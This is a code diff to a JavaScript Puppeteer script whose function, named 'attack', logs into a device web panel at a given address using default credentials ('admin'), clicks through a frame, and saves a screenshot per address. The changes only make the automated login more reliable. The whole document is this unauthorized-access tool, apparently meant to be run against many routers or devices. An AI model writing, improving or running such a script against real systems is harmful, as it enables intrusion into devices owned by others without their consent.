@@ -3,10 +3,16 @@ const defaultPassword = "admin";
 
 export default async function attack(page, endereco) {
 
-    await page.focus('#Frm_Username');
+    await (await page.waitForSelector("#Frm_Username", {
+        timeout: 5000
+    })).focus();
     await page.keyboard.type(defaultUsername);
-    await page.focus("#Frm_Password");
+
+    await (await page.waitForSelector("#Frm_Password", {
+        timeout: 5000
+    })).focus();
     await page.keyboard.type(defaultPassword);
+
     await page.click("#LoginId");
 
     const frame = await page.waitForFrame(frame => {
@@ -27,6 +33,7 @@ export default async function attack(page, endereco) {
         timeout: 2000
     })).click();
 
+    await page.waitForTimeout(4000);
     await page.screenshot({
         path: `./fotos/${endereco}.png`,
         fullPage: true
